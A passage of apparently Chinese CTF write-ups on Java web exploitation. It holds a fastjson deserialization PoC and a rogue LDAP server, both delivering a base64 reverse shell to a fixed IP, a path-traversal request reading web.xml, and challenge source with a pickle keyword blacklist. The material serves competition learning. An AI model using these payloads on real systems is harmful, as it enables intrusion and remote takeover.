class="string">&quot;ldap://107.148.75.202:1389/Exploit&quot;</span>&#125;]</span></span></span><br></pre></td></tr></table></figure><h2 id="HZNUCTF-2023-easyjava"><a href="#HZNUCTF-2023-easyjava" class="headerlink" title="[HZNUCTF 2023]easyjava"></a>[HZNUCTF 2023]easyjava</h2><p>进去提示 fastjson1.2.48 </p><p>log4j2配合fastjson1.2.48 原生反序列化</p><p>fastjson反序列化poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.ShellCode.getEvilTemplatesImpl;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Unserial_1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> getEvilTemplatesImpl(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valfield.set(val, jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(val);</span><br><span class="line">        string2file(poc, <span class="string">&quot;Unserial_1.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>伪造ldap server</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="comment">//高版本LDAP绕过</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://107.148.75.202:8000/#Evail&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">        config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                port,</span><br><span class="line">                ServerSocketFactory.getDefault(),</span><br><span class="line">                SocketFactory.getDefault(),</span><br><span class="line">                (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">        config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">        <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">        System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">        ds.startListening();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Base64.decode(<span class="string">&quot;rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAGnQAFm9yZy5leGFtcGxlLlVuc2VyaWFsXzF0AA9VbnNlcmlhbF8xLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AFXhzcgAeY29tLmFsaWJhYmEuZmFzdGpzb24uSlNPTkFycmF5AAAAAAAAAAECAAFMAARsaXN0cQB+AAd4cHNxAH4AFAAAAAF3BAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AAVMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAAcnK/rq+AAAAMwAaAQABQQcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAApTb3VyY2VGaWxlAQAGQS5qYXZhAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcABwEABjxpbml0PgEAAygpVgwACQAKCgAIAAsBABFqYXZhL2xhbmcvUnVudGltZQcADQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAA8AEAoADgARAQBhYmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzh4TURjdU1UUTRMamMxTGpJd01pOHhNak0wSURBK0pqRT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfQgAEwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABUAFgoADgAXAQAEQ29kZQAhAAIACAAAAAAAAQABAAkACgABABkAAAAaAAIAAQAAAA4qtwAMuAASEhS2ABhXsQAAAAAAAQAFAAAAAgAGcHQAAWFwdwEAeHg=&quot;</span>));</span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="网鼎杯-2020青龙组-FileJava"><a href="#网鼎杯-2020青龙组-FileJava" class="headerlink" title="[网鼎杯 2020青龙组]FileJava"></a>[网鼎杯 2020青龙组]FileJava</h2><p>读web.xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file_in_java/DownloadServlet?filename=../../../../../../../../../../../usr/local/tomcat/webapps/file_in_java/WEB-INF/web.xml</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.DownloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/DownloadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.ListFileServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ListFileServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.UploadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/UploadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>CVE-20143529</p><h2 id="CISCN-2023-西南-seaclouds"><a href="#CISCN-2023-西南-seaclouds" class="headerlink" title="[CISCN 2023 西南]seaclouds"></a>[CISCN 2023 西南]seaclouds</h2><p><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18172377">https://www.cnblogs.com/EddieMurphy-blogs/p/18172377</a></p><p><a href="https://goodapple.top/archives/1193">https://goodapple.top/archives/1193</a></p><p><a href="https://xz.aliyun.com/t/13345">https://xz.aliyun.com/t/13345</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/13279">https://xz.aliyun.com/t/13279</a></p><p><a href="https://www.cnblogs.com/kingbridge/articles/15801116.html">https://www.cnblogs.com/kingbridge/articles/15801116.html</a></p><p><a href="https://github.com/bfengj/CTF/blob/main/Web/writeup/%5B%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021%5DJavaWeb.md">https://github.com/bfengj/CTF/blob/main/Web/writeup/%5B%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021%5DJavaWeb.md</a></p><p><a href="https://github.com/bfengj/CTF/blob/main/Web/writeup/%5B%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021%5DJavaWeb.md">https://github.com/bfengj/CTF/blob/main/Web/writeup/%5B%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021%5DJavaWeb.md</a></p><h2 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/13279">https://xz.aliyun.com/t/13279</a></p><p><a href="https://www.cnblogs.com/kingbridge/articles/15801116.html">https://www.cnblogs.com/kingbridge/articles/15801116.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CISCN-2023-初赛-DeserBug&quot;&gt;&lt;a href=&quot;#CISCN-2023-初赛-DeserBug&quot; class=&quot;headerlink&quot; title=&quot;[CISCN 2023 初赛]DeserBug&quot;&gt;&lt;/a&gt;[CISCN 2023 初赛]Dese</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>羊城杯2024 Web</title>
    <link href="http://example.com/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024-Web/"/>
    <id>http://example.com/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024-Web/</id>
    <published>2024-08-28T04:35:51.000Z</published>
    <updated>2024-08-28T05:15:36.990Z</updated>
    
    <content type="html"><![CDATA[<h1 id="羊城杯2024-Web-题解"><a href="#羊城杯2024-Web-题解" class="headerlink" title="羊城杯2024 Web 题解"></a>羊城杯2024 Web 题解</h1><p>总算没有爆零, 解出了两题, ez_java花费了太多时间, 还有一个tomtom2没做出来有点小遗憾</p><h2 id="Lyrics-For-You"><a href="#Lyrics-For-You" class="headerlink" title="Lyrics For You"></a>Lyrics For You</h2><p>文件读取直接读&#x2F;proc&#x2F;self&#x2F;cmdline</p><p>然后就可以读源码了</p><p>lyrics.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> config.secret_key <span class="keyword">import</span> secret_code</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, request, render_template</span><br><span class="line"><span class="keyword">from</span> cookie <span class="keyword">import</span> set_cookie, cookie_check, get_cookie</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = random.randbytes(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserData</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username</span>):</span><br><span class="line">        self.username = username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Waf</span>(<span class="params">data</span>):</span><br><span class="line">    blacklist = [<span class="string">b&#x27;R&#x27;</span>, <span class="string">b&#x27;secret&#x27;</span>, <span class="string">b&#x27;eval&#x27;</span>, <span class="string">b&#x27;file&#x27;</span>, <span class="string">b&#x27;compile&#x27;</span>, <span class="string">b&#x27;open&#x27;</span>, <span class="string">b&#x27;os.popen&#x27;</span>]</span><br><span class="line">    valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> word.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">            valid = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> valid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/lyrics&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lyrics</span>():</span><br><span class="line">    resp = make_response()</span><br><span class="line">    resp.headers[<span class="string">&quot;Content-Type&quot;</span>] = <span class="string">&#x27;text/plain; charset=UTF-8&#x27;</span></span><br><span class="line">    query = request.args.get(<span class="string">&quot;lyrics&quot;</span>)</span><br><span class="line">    path = os.path.join(os.getcwd() + <span class="string">&quot;/lyrics&quot;</span>, query)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(path) <span class="keyword">as</span> f:</span><br><span class="line">            res = f.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No lyrics found&quot;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        user = UserData(username)</span><br><span class="line">        res = &#123;<span class="string">&quot;username&quot;</span>: user.username&#125;</span><br><span class="line">        <span class="keyword">return</span> 